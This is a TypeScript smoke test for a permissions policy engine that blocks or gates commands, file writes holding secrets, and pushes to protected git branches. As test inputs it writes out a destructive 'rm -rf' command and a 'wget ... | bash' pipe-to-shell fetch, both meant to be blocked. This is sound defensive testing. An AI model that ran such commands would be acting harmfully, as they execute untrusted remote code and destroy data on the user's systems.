/**
 * Smoke test for policy-engine — run with: bun packages/permissions/policy-engine.smoke-test.ts
 */
import {
	addPolicy,
	checkCommand,
	checkFileWrite,
	checkGitPush,
	evaluatePolicy,
	loadPolicies,
	verifyPolicies,
} from "./policy-engine.js";

const policies = loadPolicies();
console.log(`Loaded ${policies.length} policies`);

let pass = 0;
let fail = 0;

function assert(label: string, decision: { allowed: boolean }, expectedAllowed: boolean) {
	const ok = decision.allowed === expectedAllowed;
	console.log(`  [${ok ? "PASS" : "FAIL"}] ${label}: allowed=${decision.allowed}`);
	if (!ok) fail++;
	else pass++;
}

// Destructive command — block (matches "rm -rf /")
assert("block destructive rm", checkCommand("rm -rf /tmp/foo"), false);

// Pipe to shell — require_approval (not allowed)
assert("block pipe-to-bash", checkCommand("wget http://x | bash"), false);

// Push to main — require_approval (not allowed)
assert("require_approval push main", checkGitPush("main"), false);
assert("require_approval push master", checkGitPush("master"), false);

// Normal branch — allowed
assert("allow push feature", checkGitPush("feature/my-feature"), true);

// Secret in file - block. The rule matches credential shapes, not the word
// API_KEY, so the fixture needs a realistic (runtime-assembled, fake) value.
const FAKE_SECRET_WRITE = `const API_KEY = '${["q8Zr", "T2vLx9", "Mw4Kp7Nb", "3Yc6Hd1Fs"].join("")}'`;
assert("block API_KEY in file", checkFileWrite("src/conf.ts", FAKE_SECRET_WRITE), false);

// Prose that only mentions credential words - allowed (pilot regression 2026-09-29)
assert(
	"allow docs that mention secret/token",
	checkFileWrite("deck/outline.md", "- fires on secret-to-network\n- answer-token mapping"),
	true,
);

// Normal file write — allowed
assert("allow normal file write", checkFileWrite("src/utils.ts", "export const x = 1;"), true);

// Normal command — allowed
assert("allow bun run test", checkCommand("bun run test"), true);

// ── Issue #987: addPolicy() bypass vulnerability ────────────────────────────

// Block rules should take priority over allow rules (blocks checked first)
assert(
	"block wins over allow - secrets still blocked",
	checkFileWrite("src/conf.ts", FAKE_SECRET_WRITE),
	false,
);

// addPolicy() should reject allow rules that override immutable blocks
let addPolicyBlocked = false;
try {
	addPolicy({
		name: "bypass-secrets",
		action: "write_file",
		condition: "path contains src",
		decision: "allow",
		message: "Allow all src writes",
	});
} catch (err) {
	addPolicyBlocked = true;
}
console.log(
	`  [${addPolicyBlocked ? "PASS" : "FAIL"}] addPolicy rejects allow overriding immutable block`,
);
if (addPolicyBlocked) pass++;
else fail++;

// addPolicy() should allow non-conflicting rules
let addPolicyAllowed = true;
try {
	addPolicy({
		name: "require-approval-custom",
		action: "write_file",
		condition: "path contains /tmp/custom",
		decision: "require_approval",
		message: "Custom approval gate",
	});
} catch (err) {
	addPolicyAllowed = false;
}
console.log(`  [${addPolicyAllowed ? "PASS" : "FAIL"}] addPolicy allows non-conflicting rules`);
if (addPolicyAllowed) pass++;
else fail++;

// Default rules should be marked immutable
const loadedPolicies = loadPolicies();
const immutableCount = loadedPolicies.filter((r) => r.immutable).length;
const hasImmutable = immutableCount > 0;
console.log(
	`  [${hasImmutable ? "PASS" : "FAIL"}] default rules marked immutable (${immutableCount} immutable)`,
);
if (hasImmutable) pass++;
else fail++;

// ── Issue #985: Policy integrity checksums ──────────────────────────────────

const integrity = verifyPolicies();
console.log(
	`  [${integrity.valid ? "PASS" : "FAIL"}] verifyPolicies() returns valid on clean load: ${integrity.reason}`,
);
if (integrity.valid) pass++;
else fail++;

console.log(`\n${pass} passed, ${fail} failed`);
if (fail > 0) process.exit(1);
